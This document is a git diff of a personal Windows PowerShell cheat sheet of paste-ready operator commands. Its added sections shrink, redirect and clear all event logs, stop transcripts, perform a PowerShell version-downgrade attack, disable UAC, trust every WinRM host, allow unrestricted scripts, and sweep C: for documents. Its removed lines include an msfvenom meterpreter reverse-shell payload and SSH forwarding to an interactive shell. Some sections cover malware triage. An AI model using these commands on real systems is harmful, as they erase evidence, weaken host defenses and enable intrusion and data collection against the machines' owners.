@@ -1,31 +1,105 @@
-Windows pastable commands
+Windows PowerShell Pastables 
 
-%%DISABLE POWERSHELL LOGGING%%
-reg query HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription
- EnableTranscripting = 1   # is on
-reg query HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription
- EnableInvocationHeader = 1
-reg query HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription
- OutputDirectory = “”
 
- wevtutil el  # check for powershell logs
+Check PowerShell Logs with CMD
+X-----------------------------
+reg query HKLM\software\wow6432node\policies\microsoft\windows\powershell /s
+
+### Shrink Logs
+wevtutil el  # check for powershell logs
 wevtutil gl "Windows Powershell"
 wevtutil sl "Windows Powershell" /ms:1024000
 wevtutil sl "windows Powershell" /rt:true /ab:fales
 wevtutil sl "windows Powershell" /ab:false
 
-Powershell.exe $PSVersionTable
+### WRITE TO NEW LOGS ###
+wevtutil gl system                                          #check current settings
+wevtutil sl system /lfn:"C:\Windows\Temp\system.evtx"       # set new location
+
+wevtutil gl system                                          # verify
+wevtutil sl system /lfn:%SystemRoot%\System32\Winevt\Logs\system.evtx   #Move back
+del c:\windows\temp\security.evtx                           #remove old logs when done
+
+-----------------------------X
+
+
+Check PowerShell Logs with PowerShell
+X-----------------------------
+gci HKLM:\software\wow6432node\policies\microsoft\windows\powershell
+
+wevtutil el  # check for powershell logs
+wevtutil gl "Windows Powershell"
+wevtutil sl "Windows Powershell" /ms:1024000
+wevtutil sl "windows Powershell" /rt:true /ab:fales
+wevtutil sl "windows Powershell" /ab:false
 
 wevtutil el | Foreach-Object {wevtutil cl "$_"}  #clear all logs
 
-#################### Ping Sweep #####################
-1..20 | % {"192.168.1.$($_): $(Test-Connection -count 1 -comp 192.168.1.$($_) -quiet)"}								#powershell
-
-#################### Windows Payload ###############
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=443 -f exe > payload_exe
+-----------------------------X
 
 
-#################### Malware Traige ####################
+PowerShell Down Grade Attack
+X-----------------------------
+Powershell.exe $PSVersionTable
+OR
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine\PowerShellVersion
+dir %windir%\microsoft.net\framework    #powershell v 2 requires .net framework v2 
+powershell.exe -version 2.0
+
+-----------------------------X
+
+
+Start WinRM Service
+X-----------------------------
+winrm quickconfig -q (enable-psremoting -SkipNetworkprofilecheck -force)        #enable remoting on target using powershell
+get-wmiobject -class win32_service | where-object {$_.name -like "winrm"}       #check the service using powershell
+
+set-item wsman:\localhost\client\trustedhosts -value *                          #enable on localbox
+
+-----------------------------X
+
+
+Open Remote PowerShell Session
+X-----------------------------
+$cred = get-credential
+$Option = New-PSSessionOption -IdleTimeout 300000 -nomachineprofile
+$t1 = new-pssession -computer 10.10.100.178 -credential $cred -sessionoption $option
+enter-pssession -session $t1
+#Do Stuff
+exit
+remove-pssession -session $t1
+
+-----------------------------X
+
+
+PowerShell Utilty Tools
+X-----------------------------
+### Ping Sweep 
+1..254 | {ping -n 1 -w 100 192.168.1.$_ | select-string ttl}; arp -a
+
+### Elevate from limited CMD to powershell
+powershell.exe -file -
+
+### Run local script on remote computer
+Invoke-Command -Session $t1 -filepath c:\users\administrator\desktop\test.ps1
+
+### Turn off UAC
+Set-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -Value 0
+
+### Allows execution of any script
+set-executionpolicy unrestricted
+
+### Stops recording
+stop-transcript 
+
+### FILE DOWNLOAD OVER HTTP
+(new-object system.net.webclient) .downloadFile("url","dest")
+
+-----------------------------X
+
+
+Malware Traige 
+X-----------------------------
 gwmi win32_process | select-object processid, parentprocessid, commandline | format-table -autosize						# What is the parent process?
 get-authenticodesignature <cmd path>														# Is the process signed
 netstat -ano																	# Is it network aware									#Is it network aware?
@@ -48,10 +122,16 @@ schtasks /query /V /FO list
 $tasks = schtasks.exe /query /v /fo csv | ConvertFrom-Csv; $tasks | where-object {$_.'Scheduled Task State' -eq "Enabled"} | select-object TaskName, 'Task To Run'
 
 Get-wmiobject win32_service | where-object { $_.StartMode -eq 'Auto' } | format-list Name, DisplayName, PathName
+-----------------------------X                                                                                                                                                                                     
 
 
-#################### Mando ####################
+Survey 
+X-----------------------------
 get-date
+Get-ComputerInfo
+Get-WmiObject -class win32_operatingsystem | select -property * 
+Write-Output "Currently have administrative rights:"; ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] “Administrator”)
+
 Gwmi Win32_OperatingSystem | Select-Object Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | FL
 gwmi win32_process | select-object processid, parentprocessid, commandline | format-table -autosize
 Get-Service | where-object { $_.Status -eq 'running' }
@@ -67,24 +147,48 @@ auditpol /get /catagory:*																	#lists audit polocies
 Drivers
 
 Get-ChildItem -path C:\Windows\temp
+-----------------------------X                                                                                                                                                                                     
 
 
-#################### PSP ####################
-get-childitem -path registry::'HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\uninstall'
-get-itemproperty -path registry::'HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\uninstall\############'
-
-
-
-#################### Exit off Box ####################
+Exit off Box
+X-----------------------------
 Get-ChildItem -Path C:\ -recurse -force -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge (Get-Date).AddMinutes(-120) }
 get-childitem -path c:\windows\prefetch
 gwmi win32_process | select-object processid, parentprocessid, commandline | format-table -autosize
 netstat -ano
 
+-----------------------------X                                                                                                                                                                                     
 
 
-#################### SSH Connections ####################
-./survey.sh | ssh -v -x -M -S /tmp/@r user@1.1.1.1 > survey.out
-ssh -v -x -O forward -S /tmp/@r user@1.1.1.1 /bin/bash -i
-ssh -v -x -O forward -S /tmp/@r 127.0.0.1@fake -L80:2.2.2.2:80
-ssh -v -x -O forward -S /tmp/@r 127.0.0.1@fake -R 443:127.0.0.1:443
+Collection
+X-----------------------------
+get-childitem -recurse -path c:\ -include *.doc, *.docx 
+
+Get-ChildItem -Path C:\ -recurse -force -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge (Get-Date).AddMinutes(-120) }                           #liost files changed in last 2 hours
+
+-----------------------------X
+
+
+Enable and Connect to SSL 5986
+X-----------------------------
+#check winrm listeners
+WinRM e winrm/config/listener
+
+#create self signed crt
+New-SelfSignedCertificate -DnsName "< machine hostname>" -CertStoreLocation Cert:\LocalMachine\My
+
+#register https listener with winrm
+winrm create winrm/config/Listener?Address=*+Transport=HTTPS '@{Hostname="<YOUR_DNS_NAME>"; CertificateThumbprint="<COPIED_CERTIFICATE_THUMBPRINT>"}'
+
+#Open firewall
+netsh advfirewall firewall add rule name="Windows Remote Management (HTTPS-In)" dir=in action=allow protocol=TCP localport=5986
+
+#Check Setup
+WinRM e winrm/config/listener
+
+#Connect
+$options=New-PSSessionOption -SkipCACheck -SkipCNCheck
+$cred = Get-Credential
+Enter-PSSession -ComputerName <hostname> -UseSSL -SessionOption $options -Credential $cred
+
+-----------------------------X
